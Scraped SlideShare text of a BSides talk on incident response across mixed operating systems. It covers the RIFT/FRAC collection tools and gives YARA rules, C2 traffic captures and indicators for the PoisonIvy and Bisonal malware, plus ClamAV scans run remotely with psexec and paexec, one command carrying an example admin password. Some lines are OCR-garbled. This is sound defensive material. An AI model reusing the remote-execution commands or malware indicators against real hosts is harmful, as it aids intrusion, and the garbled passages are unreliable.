{
    "id": "276eb3db-c92a-424f-9033-9a312442dc70",
    "created_at": "2023-01-12T15:00:17.745228Z",
    "updated_at": "2025-03-27T02:16:25.861974Z",
    "deleted_at": null,
    "sha1_hash": "7ee5d5b69bbbcc9e865e2ce5307a279e7742b26b",
    "title": "2018-05-15 - IR in Heterogeneous Environment",
    "authors": "",
    "file_creation_date": "2022-05-28T16:47:25Z",
    "file_modification_date": "2022-05-28T16:47:25Z",
    "file_size": 2278857,
    "plain_text": "# BSides IR in Heterogeneous Environment\n\n**slideshare.net/StefanoMaccaglia/bsides-ir-in-heterogeneous-environment**\n\nStefano Maccaglia\n\n0\n\nShare\n\nNext SlideShares\n\nUpcoming SlideShare\n\n\n-----\n\n[ CO 0 0 C age] eat u t g a d Ca pa g ac g o s op ppt\n\nLoading in …3\n\n×\n\n1 of 38\n\n1 of 38\n\n## More Related Content\n\n### Featured\n\nWhat to Upload to SlideShare\n\nSlideShare\n\nBe A Great Product Leader (Amplify, Oct 2019)\n\nAdam Nash\n\nTrillion Dollar Coach Book (Bill Campbell)\n\nEric Schmidt\n\nAPIdays Paris 2019 - Innovation @ scale, APIs as Digital Factories' New Machi...\n\napidays\n\nA few thoughts on work life-balance\n\nWim Vanderbauwhede\n\nIs vc still a thing final\n\nMark Suster\n\n\n-----\n\nThe GaryVee Content Model\n\nGary Vaynerchuk\n\nMammalian Brain Chemistry Explains Everything\n\nLoretta Breuning, PhD\n\nBlockchain + AI + Crypto Economics Are We Creating a Code Tsunami?\n\nDinis Guarda\n\nThe AI Rush\n\nJean-Baptiste Dumont\n\nAI and Machine Learning Demystified by Carol Smith at Midwest UX 2017\n\nCarol Smith\n\n10 facts about jobs in the future\n\nPew Research Center's Internet & American Life Project\n\nHarry Surden - Artificial Intelligence and Law Overview\n\nHarry Surden\n\n\n-----\n\ns de Goog e s u be s 0\n\nRand Fishkin\n\nPinot: Realtime Distributed OLAP datastore\n\nKishore Gopalakrishna\n\nHow to Become a Thought Leader in Your Niche\n\nLeslie Samuel\n\nVisual Design with Data\n\nSeth Familian\n\nDesigning Teams for Emerging Challenges\n\nAaron Irizarry\n\nUX, ethnography and possibilities: for Libraries, Museums and Archives\n\nNed Potter\n\nWinners and Losers - All the (Russian) President's Men\n\nIan Bremmer\n\n### Related Books\n\nFree with a 14 day trial from Scribd\n\n[See all](https://scribd.com/books)\n\n\n-----\n\nSo You Want to Start a Podcast: Finding Your Voice, Telling Your Story, and Building a Community That Will Listen Kristen Meinzer\n\n(3.5/5)\n\nFree\n\nTalk to Me: How Voice Computing Will Transform the Way We Live, Work, and Think James Vlahos\n\n(4/5)\n\nFree\n\nFrom Gutenberg to Google: The History of Our Future Tom Wheeler\n\n(3.5/5)\n\nFree\n\nSAM: One Robot, a Dozen Engineers, and the Race to Revolutionize the Way We Build Jonathan Waldman\n\n(5/5)\n\nFree\n\n\n-----\n\nThe Future Is Faster Than You Think: How Converging Technologies Are Transforming Business, Industries, and Our Lives Peter H.\nDiamandis\n\n(4.5/5)\n\nFree\n\nAutonomy: The Quest to Build the Driverless Car—And How It Will Reshape Our World Lawrence D. Burns\n\n(5/5)\n\nFree\n\nNo Filter: The Inside Story of Instagram Sarah Frier\n\n(4.5/5)\n\nFree\n\nBezonomics: How Amazon Is Changing Our Lives and What the World's Best Companies Are Learning from It Brian Dumaine\n\n(4/5)\n\nFree\n\n\n-----\n\nLive Work Work Work Die: A Journey into the Savage Heart of Silicon Valley Corey Pein\n\n(4.5/5)\n\nFree\n\nFuture Presence: How Virtual Reality Is Changing Human Connection, Intimacy, and the Limits of Ordinary Life Peter Rubin\n\n(4/5)\n\nFree\n\nLife After Google: The Fall of Big Data and the Rise of the Blockchain Economy George Gilder\n\n(4/5)\n\nFree\n\nEverybody Lies: Big Data, New Data, and What the Internet Can Tell Us About Who We Really Are Seth Stephens-Davidowitz\n\n(4.5/5)\n\nFree\n\n\n-----\n\nUnderstanding Media: The Extensions of Man Marshall McLuhan\n\n(4/5)\n\nFree\n\nThe Art of War Sun Tsu\n\n(3/5)\n\nFree\n\nUncommon Carriers John McPhee\n\n(3.5/5)\n\nFree\n\nThe Victorian Internet: The Remarkable Story of the Telegraph and the Nineteenth Century's On-line Pioneers Tom Standage\n\n(3.5/5)\n\nFree\n\n### Related Audiobooks\n\nFree with a 14 day trial from Scribd\n\n[See all](https://scribd.com/audiobooks)\n\n\n-----\n\nThe Quiet Zone: Unraveling the Mystery of a Town Suspended in Silence Stephen Kurczy\n\n(4.5/5)\n\nFree\n\nThe Wires of War: Technology and the Global Struggle for Power Jacob Helberg\n\n(4/5)\n\nFree\n\nSystem Error: Where Big Tech Went Wrong and How We Can Reboot Rob Reich\n\n(4.5/5)\n\nFree\n\nAfter Steve: How Apple Became a Trillion-Dollar Company and Lost its Soul Tripp Mickle\n\n(4.5/5)\n\nFree\n\nDignity in a Digital Age: Making Tech Work for All of Us Ro Khanna\n\n(4/5)\n\nFree\n\n\n-----\n\nEinstein's Fridge: How the Difference Between Hot and Cold Explains the Universe Paul Sen\n\n(4.5/5)\n\nFree\n\nDriven: The Race to Create the Autonomous Car Alex Davies\n\n(4.5/5)\n\nFree\n\nTest Gods: Virgin Galactic and the Making of a Modern Astronaut Nicholas Schmidle\n\n(5/5)\n\nFree\n\nSecond Nature: Scenes from a World Remade Nathaniel Rich\n\n(5/5)\n\nFree\n\nSpooked: The Trump Dossier, Black Cube, and the Rise of Private Spies Barry Meier\n\n(4/5)\n\nFree\n\n\n-----\n\nA World Without Work: Technology, Automation, and How We Should Respond Daniel Susskind\n\n(4.5/5)\n\nFree\n\nLean Out: The Truth About Women, Power, and the Workplace Marissa Orr\n\n(4.5/5)\n\nFree\n\nBlockchain: The Next Everything Stephen P. Williams\n\n(4/5)\n\nFree\n\nUncanny Valley: A Memoir Anna Wiener\n\n(4/5)\n\nFree\n\nUser Friendly: How the Hidden Rules of Design Are Changing the Way We Live, Work, and Play Cliff Kuang\n\n(4.5/5)\n\nFree\n\n\n-----\n\nBitcoin Billionaires: A True Story of Genius, Betrayal, and Redemption Ben Mezrich\n\n(4.5/5)\n\nFree\n\n1. 1. Practical Incident Response in Heterogeneous Environment Keven Murphy & Stefano Maccaglia 1\n[2. 2. The mass-triage problem in 2018 • The investigation process (Triage), in any IT incident, is the key to solve the case and to clean all](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-2-638.jpg?cb=1526345712)\n\nthe affected systems. • But in heterogeneous environments, where Windows, Linux, Mac OS, and Unix systems are potentially affected\nby the attacker, the investigation process is slowed by a number of technical complexities. � First problem is related to a common\nplatform and procedure to adopt for the triage as many technologies are capable of covering only a portion of the environment. � Second\nproblem, what to look for, as the triage is aimed to identify malicious artifacts and usual technologies are not providing flexibility and\nagility to shape the triage process. � Third problem, the capability to search the heterogeneous environment using custom IOCs. �\nFourth problem, the possibility to pinpoint known badness which allows for easier mitigation. • In our approach, the IOCs play an\nimportant role both for the investigation process and the definition of the best way to approach the triage. We were looking to a “rule them\nall” solution aimed to overcome traditional limitations of the most common commercial solutions. 2\n[3. 3. Traditional IOCs application • The traditional IR approach: • Context, in regard of IOCs, typically does not exists. • Application of IOCs](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-3-638.jpg?cb=1526345712)\n\nto the environment is rule-based • Customization of IOCs are not an option in some commercial products. • Rule-based detection will\nmiss changes made to the actor’s tools 3\n[4. 4. Our idea • The production of code leaves traces in any binary. • The binary can contain debugging symbols, which give you a lot of](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-4-638.jpg?cb=1526345712)\n\ninformation. • Often the attacker tools include the use of specific libraries or functions. • A lot of fingerprinting can be done with software,\nan this is very useful for IR analyses. • The combined information of both can help to solve the attribution problem. • Helps with\nassessment of risks • Identifying end goals for known actors • Aid the creation of IOCs that are “actionable” and not “disposable” 4\n[5. 5. RIFT (Retrieve Interesting Files Tool) ● Retrieves files/directories based on regex list ● Uses Sleuthkit to retrieve files forensically ●](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-5-638.jpg?cb=1526345712)\n\nOutputs files files into a directory (machine name) ● Retrieved files are saved remote share/USB ● Recreates the directory structure of\nwhere the file was found ● To run: ● Download: rift --verbose --savedrive [SAVEDRIVE] https://github.com/chaoticmachinery/frac_rift 5\n[6. 6. Getfileslist.txt examples ● “getfileslist.txt” contains a regex list of files and directories that RIFT will retrieve 6 ntuser.dat$](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-6-638.jpg?cb=1526345712)\n\nsystem32/winevt/logs/ ^/etc/ .ssh\n[7. 7. FRAC (Forensic Response ACquisition) ● Uses RIFT to forensically retrieve files/directories across the network ● Recommend using](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-7-638.jpg?cb=1526345712)\n\nPAExec or SSH/SSHPASS to connect to remote machines ● Requires local admin rights and remote share (SMB/NFS depending on OS)\n\n   - Supports single IP, CIDR notation, and IP range like the following examples: ● Can be used to execute any command on remote\nmachines ● To run: –172.16.10.12 –172.16.10.1/24 –172.16.10.1-172.16.10.230 frac_v0.05 --iplist iplist.txt --cmd cmd.txt –verbose\npaexec.exe [IP] -n 4 -u [ADMINID] -p [ADMINPASS] -s cmd /C \"net use [SHAREDRV] /delete /yes & net use [SHAREDRV] [SHARE]\n/user:[SHAREUSERID] [SHAREPASSWD] && cd /d [SAVEDRIVE] && rift.exe -- verbose --savedrive [SAVEDRIVE] && net use\n\n[SHAREDRV] /delete /yes\" sshpass -p [ADMINPASS] ssh [IP] \"mkdir [SHAREDRV];mount [MNTOPTS] [SRCBOX]:[SRCMNT]\n\n[SHAREDRV] ; cd [SHAREDRV]/frac_v0.05 && ./rift -- verbose --savedrive [SAVEDRIVE] ; cd / && umount [SHAREDRV] && rmdir\n\n[SHAREDRV]\" Examples of Cmd.Txt 7\n[8. 8. FRAC (Forensic Response Acquisition): The Output ● FRAC/RIFT creates directories with the hostname of the machine drwxr-xr-x 7](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-8-638.jpg?cb=1526345712)\n\nroot root 4096 Apr 11 19:39 machinea_04112018_19-18-58 drwxr-xr-x 9 root root 4096 Apr 11 20:11 machineb_04112018_15-19-02\ndrwxr-xr-x 135 root root 20480 Apr 11 19:37 etc -rw-r--r-- 1 root root 675539 Apr 11 19:40 getfiles.txt drwxr-xr-x 3 root root 4096 Apr 11\n19:37 home drwxr-xr-x 3 root root 4096 Apr 11 19:37 opt drwxr-xr-x 5 root root 4096 Apr 11 19:21 root -rw-r--r-- 1 root root 230661477\nApr 11 19:43 machineb_04112018_15-19-28_fls.out drwxr-xr-x 5 root root 4096 Apr 11 19:38 usr drwxr-xr-x 5 root root 4096 Apr 11 19:40\nvar Getfiles.txt Contains the mactime information for all of the files retrieved as well as the inode *fls.out Contains the fls.out (mactime)\noutput from the Sleuthkit FLS command. All of the directory structure is recreated and files are forensically copied to where they existed\non the drive. 8\n[9. 9. Actionable IOCs (AIOCs) • The concept of “actionable” IOCs has been derived and refined from a collective set of Incident Response](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-9-638.jpg?cb=1526345712)\n\ninvestigations, and could become a valid support of our investigative process if organized in a scientifically sound approach. • Utilizes\nprocedures, analysis, and evidence for a methodical approach • Based on positive matches can help identify the attacker • It allow the\ncreation of a structured knowledge base of attackers • The knowledge base allows the creation of attacker profiles 9\n[10. 10. Malware analysis process to build AIOCs 10](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-10-638.jpg?cb=1526345712)\n[11. 11. Example: PoisonIvy • PoisonIvy, a Remote Access Tool/Trojan (RAT) often used in targeted attacks, had been widely seen until](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-11-638.jpg?cb=1526345712)\n\naround 2013. • Since then, the number of cases using PoisonIvy decreased, and there was no special variant with expanded features\nseen in the wild. • However, recently, we identified PoisonIvy with expanded features in its communication function capable to bypass\nHTTP/HTTPS proxy in APT and cybercriminal attacks thanks to modifications in the malware code. Latest PoisonIvy variants are\ndifferent 11\n\n\n-----\n\nU S o so y typ ca OC u e po so y_ at { eta desc pt o o so y aut o Jea ppe e ss e /\n@Jipe_\" date = \"2013-02-01\" filetype = \"memory\" version = \"1.0\" ref1 =\n\"https://code.google.com/p/volatility/source/browse/trunk/contrib/plugins/malware/poisonivy.py strings: $a = { 53 74 75 62 50 61 74 68 ??\n53 4F 46 54 57 41 52 45 5C 43 6C 61 73 73 65 73 5C 68 74 74 70 5C 73 68 65 6C 6C 5C 6F 70 65 6E 5C 63 6F 6D 6D 61 6E 64 [22]\n53 6F 66 74 77 61 72 65 5C 4D 69 63 72 6F 73 6F 66 74 5C 41 63 74 69 76 65 20 53 65 74 75 70 5C 49 6E 73 74 61 6C 6C 65 64 20\n43 6F 6D 70 6F 6E 65 6E 74 73 5C } condition: $a } rule PoisonIvy_2 { meta: author = \" Kevin Breen <kevin@techanarchy.net>\" date =\n\"2014/04\" ref = \"http://malwareconfig.com/stats/PoisonIvy\" maltype = \"Remote Access Trojan\" filetype = \"exe\" strings: $stub = {04 08 00\n53 74 75 62 50 61 74 68 18 04} $string1 = \"CONNECT %s:%i HTTP/1.0\" $string2 = \"ws2_32\" $string3 = \"cks=u\" $string4 = \"thj@h\"\n$string5 = \"advpack\" condition: $stub at 0x1620 and all of ($string*) or (all of them) } } rule PoisonIvy_Generic_3 { meta: description =\n\"PoisonIvy RAT Generic Rule\" author = \"Florian Roth\" date = \"2015-05-14\" hash = \"e1cbdf740785f97c93a0a7a01ef2614be792afcd\"\nstrings: $k1 = \"Tiger324{\" fullword ascii $s2 = \"WININET.dll\" fullword ascii $s3 = \"mscoree.dll\" fullword wide $s4 = \"WS2_32.dll\" fullword\n$s5 = \"Explorer.exe\" fullword wide $s6 = \"USER32.DLL\" $s7 = \"CONOUT$\" $s8 = \"login.asp\" $h1 = \"HTTP/1.0\" $h2 = \"POST\" $h3 =\n\"login.asp\" $h4 = \"check.asp\" $h5 = \"result.asp\" $h6 = \"upload.asp\" condition: uint16(0) == 0x5a4d and filesize < 500KB and ( $k1 or all\nof ($s*) or all of ($h*) ) rule PoisonIvy_Sample_APT { meta: description = \"Detects a PoisonIvy APT malware group\" author = \"Florian\nRoth\" reference = \"VT Analysis\" date = \"2015-06-03\" hash = \"b874b76ff7b281c8baa80e4a71fc9be514093c70\" strings: $s0 = \"pidll.dll\"\nfullword ascii $s1 = \"sens32.dll\" fullword wide $s3 = \"FileDescription\" fullword wide $s4 = \"OriginalFilename\" fullword $s5 =\n\"ZwSetInformationProcess\" fullword ascii $s9 = \"Microsoft Media Device Service Provider\" fullword wide condition: uint16(0) == 0x5a4d\nand filesize < 47KB and all of them } 12\n[13. 13. rule PoisonIvy { strings: $s1 = \"%supdate%4d%02d%02d%02d%02d%02d.tmp\" wide ascii $s2 = \"cks=u\" wide ascii $s3 =](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-13-638.jpg?cb=1526345712)\n\n“CONNECT %s:%i HTTP//1.0” wide ascii $s4 = “vry7fo/URLDownez{” wide ascii $s5 = “6u%u.193.%d” wide ascii $s6 = “/c del %s > nul”\nwide ascii $s7 = “%u.193.%d.%d” wide ascii $s8 = “GET %s HTTP/1.1” wide ascii condition: ($s1 and $s2 and $s3) or ($s4 and $s5) or\n($s6 and $s7 and $s8) and // MZ signature at offset 0 and ... uint16(0) == 0x5A4D and // ... PE signature at offset stored in MZ header at\n0x3C uint32(uint32(0x3C)) == 0x00004550 } YARA RULES PoisonIvy Actionable IOC: Yara rule The first three strings identify the\nPoisonIvy generic variants, including latest ones. These strings match an old version of PoisonIvy 2011 packed in UPX. For the same\nsample, we use these strings to match the decompressed version of PoisonIvy (always 2011).\n[14. 14. AIOCs formalization process Atomic IOCs High order Yara rules for files and packets Actor tags and attack descriptions Actor tools](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-14-638.jpg?cb=1526345712)\n\nHigh order ClamAV signature High order log and system artifacts System and network visibility Alternative System visibility Log and\nartifacts visibility Classification and attribution Virustotal and other repository searches Evolutive and comparative analysis formalization\n14\n[15. 15. • Bisonal is another example. It is a backdoor. • The malware can be split into two components: � the main module, � communication](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-15-638.jpg?cb=1526345712)\n\nmodule. • The main module is responsible for providing the framework to execute the various components within the malware. • The\ncommunication module is responsible for the sending of information to the server, receiving new commands from it and downloading of\nnew executable. • If a new executable is downloaded successfully, it will notifying the main module to execute it. • The malware is\ncapable of: • Listing and controlling processes • Creating and deleting files • Creating a remote shell • Downloading and executing files •\nBisonal is an APT tool. Trojan.Bisonal 15\n[16. 16. Trojan.Bisonal traffic • Custom “flag” and c2 domain – used to track victim 16 GET /j/news.asp?id=* HTTP/1.1 User-Agent: flag:khi](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-16-638.jpg?cb=1526345712)\n\nhost:Business IP:10.0.0.51 OS:XPSP3 vm:.. proxy:.. Host: online.cleansite.us Cache-Control: no-cache ---------------- GET /a.asp?id=*\nHTTP/1.1 Accept:*/* Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0;.NET\nCLR 2.0.50727; .NET CLR 3.0.04.506.648;.NET CLR 3.5.21002) Host: khi.acmetoy.com Connection: Keep-Alive GET /rc/news1.asp?\nid=flag:831nec%20host:Remote%20PC%20 IP:169.254.100.211%20OS:XPSP3%20vm:..%20proxy:.. HTTP/1.1 User-Agent: flag:831nec\nhost:Remote PC IP:169.254.100.211 OS:XPSP3 vm:?? proxy:?? Host: online.4pu.com ---------------- GET /a.asp?id=* HTTP/1.1\nAccept:*/* Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0;.NET CLR\n2.0.50727; .NET CLR 3.0.04.506.648;.NET CLR 3.5.21002) Host: necnec.dns04.com Connection: Keep-Alive\n[17. 17. Trojan.Bisonal resulting AIOC description o Type of malware: Modular Trojan (single stage), mainly used for data stealing o](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-17-638.jpg?cb=1526345712)\n\nCapabilities: beaconing, listing and controlling processes, creating and deleting files, creating remote shells, downloading and executing\nfiles o Dissemination strategy: via Dropper or email attachment o Architecture: Client / Server using public C2s o Type of communication:\nHTTP protocol (in general it uses TCP/80 and TCP/443, but port can be customized) o Related Adversary: HeartBeat APT Group\n(Chinese) o Earlier Adversary detection: November 2009 (South Korea - TrendMicro) o Area of operation: actually limited to Asia\n(including Russia) o Recorded targets: Mitsubishi Heavy Industries, NEC Corp, Nippon Steel Corp, IHI Corp, several Ministries in Japan\nand South Korea. o Type of AIOCs developed: Yara rules for files, Yara rules for PCAPs, ClamAV rules, Snort Rule, Registry and logs. 17\n[18. 18. Bisonal Behavior � Sample: 918a78b49397b17da48f37206fa7801b11d410ea6faa755d0aa27872c7e84c74 � set registry value �](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-18-638.jpg?cb=1526345712)\n\nkey: HKCUSoftwareMicrosoftWindowsCurrentVersionRun value: dfea data: C:Windowstasksdfea.exe � key:\nHKCUSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZoneMap value: UNCAsIntranet data: 0 � key:\nHKCUSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZoneMap value: AutoDetect data: 1 � Sample>\nE8ff9de367c771fd9a5ae2df91b62fe57a64f528a7a80dbd9e307a7ae3e6af80 � Set registry value � key:\nHKCUSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZoneMap value: UNCAsIntranet data: 0 � key:\nHKCUSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZoneMap value: AutoDetect data: 1 Registry keys IOCs 18 � Sample:\n918a78b49397b17da48f37206fa7801b11d410ea6faa755d0aa27872c7e84c74 � Create File � C:WindowsTasksdfea.exe � Sample:\nE8ff9de367c771fd9a5ae2df91b62fe57a64f528a7a80dbd9e307a7ae3e6af80 � Create File �\nC:UsersAdminAppDataLocalTempchrome.exe � C:WindowsTaskstaskeng.exe Created files IOCs\n\n\n-----\n\n9 [9](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-19-638.jpg?cb=1526345712) U S u e oja so a { st gs $s o%00 y |t}ppt |p 0Josp { s 0y 0g0p/ o de asc $s de a\nwide ascii $s3 = \"love a meng\" wide ascii $s4 = \"HE@L-PShellE\" wide ascii $s5 = \"xecut\" $s6 = \"wkko%00yjq{1|r|1pm1tm0Josp~\n{Yvsz0y~rz0g0p/1~lo\" wide ascii $s7 = \"http://%s/%s.asp?id=%s%s%s\" $s8 = \"http://%s/a.asp?id=%s%s\" $s9 = \"c:a1.txt“ condition: ($s1\nand $s2) or ($s2 and $s3) or ($s4 and $5) and ($s6 and $s7 and $s8 and $s9) and // MZ signature at offset 0 and ... uint16(0) == 0x5A4D\nand // ... PE signature at offset stored in MZ header at 0x3C uint32(uint32(0x3C)) == 0x00004550 } Trojan.Bisonal family the first two\nstrings are common to other Bisonal samples, but not all. The latest samples contain different strings, except for $s6 string which is very\nsimilar to the first string in conditition $s1. These strings match a Bisonal sample that uses a common obfuscation techniques(split a word\nin more lines). Beyond the common string “defa” the samples of bisonal present different string. 19\n[20. 20. � Flag:727x � Flag:1223 � Flag:8080 � Flag:84d � Flag:d2 � Flag:dick � Flag:ihi IHI Corp � Flag:m615 � Flag:MARK 1 �](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-20-638.jpg?cb=1526345712)\n\nFlag:nec01NEC Corp � Flag:nsc516 Nippon Streel Corp � Flag:qqq � Flag:toray � Flag:410maff Ministry of Agriculture, Forestry and\nFisheries � Flag:712mhi Mitsubishi Heavy Industries � ... YARA RULES toward AIOCs Trojan.Bisonal family rule campaignA { strings:\n$s00 = \"Flag:8080\" ascii wide nocase condition: all of them and uint16(0) == 0xC3D4 } rule campaignB { strings: $s00 = \"Flag:84d\" ascii\nwide nocase condition: all of them and uint16(0) == 0xC3D4 } rule campaignC { strings: $s00 = \"flag:boat\" ascii wide nocase condition: all\nof them and uint16(0) == 0xC3D4 } rule campaignD { strings: $s00 = \"Flag:d2\" ascii wide nocase condition: all of them and uint16(0) ==\n0xC3D4 } rule campaignE { strings: $s00 = \"Flag:dick\" ascii wide nocase condition: all of them and uint16(0) == 0xC3D4 } rule\ncampaignF { strings: $s00 = \"flag:ihi\" ascii wide nocase condition: all of them and uint16(0) == 0xC3D4 } rule campaignW { strings: $s00\n= \"Flag:qqq\" ascii wide nocase condition: all of them and uint16(0) == 0xC3D4 } To develop AIOCs from atomic indicators we need to\nincorporate «actionable» elements that link the malware to a specific actor and campaign... This Yara can be applied to PCAPs 20\n[21. 21. Why ClamAV for AIOCs? 21](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-21-638.jpg?cb=1526345712)\n[22. 22. 22 Clam AV: Intro • ClamAV is an open source and free anti-virus program. • ClamAV runs on Windows (ClamWin), Linux, BSD,](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-22-638.jpg?cb=1526345712)\n\nSolaris, and Mac OS X, and its mainly designed to scan email attachment, but it can be used as a regular anti- virus. • ClamAV includes:\n\n  - Features • Can search archives • Can search multiple file types • Multithreaded � Clamscan � Clamdscan/Clamd � Freshclam\nCommand line virus scanner Client/Server virus scanner tool to update the virus definition database\n[23. 23. 23 YARA Rules, AIOCs and ClamAV • Yara is the swiss army knife for any low-cost triage and can be applied to many endpoint](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-23-638.jpg?cb=1526345712)\n\nforensic platforms. • Values that work across multiple platforms • Text strings • Hex values that are in multiple versions of the binary •\nClamAV provides combination of both worlds. • By empowering ClamAV with Yara rules, we are able to run massive triage on almost all\ntype of system using AIOCs we have developed.\n[24. 24. Using ClamAV to Scan for Badness clamscan --infected --recursive --allmatch –archive -verbose --database ./{yara sigs}.yara](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-24-638.jpg?cb=1526345712)\n\n{starting directory} | tee clamav_{date}_yara clamscan --infected --recursive --allmatch --archive-verbose --database ./{clamav sigs}.ldb\n{starting directory} | tee clamav_{date}_sigs 24\n[25. 25. Using ClamAV: Results Custom Rules - ClamAV ● Multiple hits on the same file helps to verify results /kswapd0:](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-25-638.jpg?cb=1526345712)\n\ncpuminer_v2.3.3_64bit.UNOFFICIAL FOUND /kswapd0: cpuminer_generic.UNOFFICIAL FOUND /kswapd0:\ncpuminer_v2.3.3_102917_64bit.UNOFFICIAL FOUND /kswapd0: cpuminer_v2.3.3_102917_32bit.UNOFFICIAL FOUND /kswapd0!(0):\ncpuminer_v2.3.3_102917_32bit.UNOFFICIAL FOUND /minerd: minerd_cpuminer_v2.3.3_64bit.UNOFFICIAL FOUND /minerd:\ncpuminer_generic.UNOFFICIAL FOUND /minerd!(0): cpuminer_generic.UNOFFICIAL FOUND /yam: yam_cpuminer_64bit.UNOFFICIAL\nFOUND /yam!(0): yam_cpuminer_64bit.UNOFFICIAL FOUND /gcc: XMRig_v2.3.1.UNOFFICIAL FOUND /gcc!(0):\nXMRig_v2.3.1.UNOFFICIAL FOUND 25\n[26. 26. Using ClamAV: Results Custom Rules - Yara ● Multiple hits on the same file helps to verify results config.json:](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-26-638.jpg?cb=1526345712)\n\nYARA.stratum.UNOFFICIAL FOUND config.json: YARA.monero.UNOFFICIAL FOUND config.json: YARA.monerohashcom.UNOFFICIAL\nFOUND config.json!(0): YARA.monerohashcom.UNOFFICIAL FOUND outfile: YARA.stratum.UNOFFICIAL FOUND outfile:\nYARA.cpuminer.UNOFFICIAL FOUND outfile!(0): YARA.cpuminer.UNOFFICIAL FOUND kswapd0: YARA.stratum.UNOFFICIAL FOUND\nkswapd0: YARA.cpuminer.UNOFFICIAL FOUND kswapd0!(0): YARA.cpuminer.UNOFFICIAL FOUND 26\n[27. 27. Sigtool: ClamAV command line 27 Sigtool (signature and database management tool) Signature using the hash of the PE-section of](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-27-638.jpg?cb=1526345712)\n\nan executable Signature using full MD5 hash of file Signature using the a hex fragment of a file\n[28. 28. C:Documents and SettingsuserDesktop> sigtool --md5 malware.exe >> sigFile.hdb C:Documents and SettingsuserDesktop>type](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-28-638.jpg?cb=1526345712)\n\nsigFile.hdb B4619d8058362b38d20480c14d30c209:40500:malware.exe C:Documents and SettingsuserDesktop> sigtool --mdb\nmalware.exe.text.dat >> sigFile.mdb • To create a unique signature for an executable file we use the --md5 option of sigtool, and then\nsave the output into a file with a “.hdb” extension. • To create a signature that will match a particular PE section (typically the sections are\nlabelled .text, .rdata, .data, .idata, etc.), use the “--mdb” option of sigtool and then save the output into a “.mdb” file. The easiest way to\ngenerate MD5 based section signatures is to extract target PE sections into separate files. Sigtool: Command explained 28\n[29. 29. C:Documents and SettingsuserDesktop> echo I am malware | sigtool --hex-dump 4920616d2061206d616c77617265200d0a](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-29-638.jpg?cb=1526345712)\n\nC:Documents and SettingsuserDesktop> echo testSig:0:*:4920616d2061206d616c77617265200d0a >> sigFile.ndb • The last method is\nto use Body-based signatures in an hexadecimal format. It relies on extracted strings from the body of the file. • In the next example we\ncreate an hex dump of the string “I am malware”. • Next we save the signature that has the format called “Extended Signature”:\nMalwareName:TargetType:Offset:HexSignature and redirect the output to a file “.ndb”. Sigtool: Command explained 29\n[30. 30. Generating ClamAV Signatures with IDA with CASC ● ClamAV Signature Creator (CASC) ● How to use it: https://github.com/Cisco-](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-30-638.jpg?cb=1526345712)\n\nTalos/CASC/wiki Open binary in IDA and select Strings Window Right click and select add string 1 Select text2 3 30\n[31. 31. Generating ClamAV Signatures with IDA with CASC • Select signature(s) and hit “Create ClamAV Signature” button on the ClamAV](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-31-638.jpg?cb=1526345712)\n\nSignature Creator view. • In the popup, find the signature and save to file Note: Make sure the extension is ldb 4 5 31\n[32. 32. Remote ClamAV scan with Psexec � Psexec can execute remote commands and so start the scan on every computer of a network.](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-32-638.jpg?cb=1526345712)\n\n� To use Psexec, the user must have rights to access the filesystem of the target computer. > psexec 192.168.81.128 -u administrator -p\np4ssw0rd1! \"C:Program Files (x86)ClamAV clamscan\" -r -d C:bioazih.ndb C: > psexec DESTINATIONIP -u USER -p PASSWORD\n“REMOTE_PATH_TO_CLAMSCAN\" -r -d LOCAL_PATH_TO_CLAMAV_DATABASE_FILE 